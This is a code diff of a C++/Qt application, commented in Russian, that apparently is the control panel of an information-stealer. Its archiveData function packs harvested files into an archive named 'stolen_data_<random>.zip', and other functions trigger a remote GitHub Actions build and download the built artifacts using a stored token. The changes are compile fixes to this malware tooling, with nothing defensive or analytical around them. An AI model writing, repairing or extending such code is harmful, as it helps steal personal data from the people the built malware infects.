@@ -1565,11 +1565,13 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
     zip_error_t err;
-    zip_error_init(&err); // Инициализация структуры zip_error_t
+    zip_error_init(&err); // Инициализация структуры ошибки
+
+    // Открытие архива с передачей указателя на zip_error_t
     zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
     if (!zip) {
         emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::fromStdString(zip_error_strerror(&err)));
-        zip_error_fini(&err); // Очистка структуры
+        zip_error_fini(&err);
         return "";
     }
 
@@ -1580,13 +1582,10 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
             continue;
         }
 
-        zip_error_t sourceErr;
-        zip_error_init(&sourceErr); // Инициализация структуры для источника
-        zip_source_t* source = zip_source_file_create(filePath.c_str(), 0, -1, &sourceErr);
+        zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, -1);
         if (!source) {
             emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + 
-                    QString::fromStdString(zip_error_strerror(&sourceErr)));
-            zip_error_fini(&sourceErr); // Очистка структуры
+                    QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
             continue;
         }
 
@@ -1603,18 +1602,18 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     if (!hasFiles) {
         emitLog("Ошибка: Нет файлов для добавления в ZIP-архив");
         zip_discard(zip);
-        zip_error_fini(&err); // Очистка структуры
+        zip_error_fini(&err);
         return "";
     }
 
     if (zip_close(zip) < 0) {
         emitLog("Ошибка закрытия ZIP-архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
-        zip_discard(zip);
-        zip_error_fini(&err); // Очистка структуры
+        zip_discard(zip); // Отмена изменений при ошибке закрытия
+        zip_error_fini(&err);
         return "";
     }
 
-    zip_error_fini(&err); // Очистка структуры после успешного завершения
+    zip_error_fini(&err); // Очистка после успешного завершения
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
 }
@@ -2578,7 +2577,7 @@ void MainWindow::triggerGitHubActions() {
     }
 
     QString url = "https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches";
-    QNetworkRequest request(QUrl(url));
+    QNetworkRequest request{QUrl(url)}; // Исправили здесь
     request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
     request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
     request.setRawHeader("Accept", "application/vnd.github.v3+json");
@@ -2612,7 +2611,7 @@ void MainWindow::checkBuildStatus() {
     }
 
     QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs";
-    QNetworkRequest request(QUrl(url));
+    QNetworkRequest request{QUrl(url)}; // Исправили здесь
     request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
     request.setRawHeader("Accept", "application/vnd.github.v3+json");
 
@@ -2665,7 +2664,7 @@ void MainWindow::downloadArtifacts() {
     }
 
     QString url = "https://api.github.com/repos/" + githubRepo + "/actions/runs/" + QString::number(runId) + "/artifacts";
-    QNetworkRequest request(QUrl(url));
+    QNetworkRequest request{QUrl(url)}; // Исправили здесь
     request.setRawHeader("Authorization", ("Bearer " + githubToken).toUtf8());
     request.setRawHeader("Accept", "application/vnd.github.v3+json");
 
@@ -2688,7 +2687,7 @@ void MainWindow::downloadArtifacts() {
             QString downloadUrl = artifact["archive_download_url"].toString();
             artifactId = artifact["id"].toInt();
 
-            QNetworkRequest downloadRequest(QUrl(downloadUrl));
+            QNetworkRequest downloadRequest{QUrl(downloadUrl)}; // Исправили здесь
             downloadRequest.setRawHeader("Authorization", ("Bearer " + githubTokenLineEdit->text()).toUtf8());
             downloadRequest.setRawHeader("Accept", "application/vnd.github.v3+json");
 
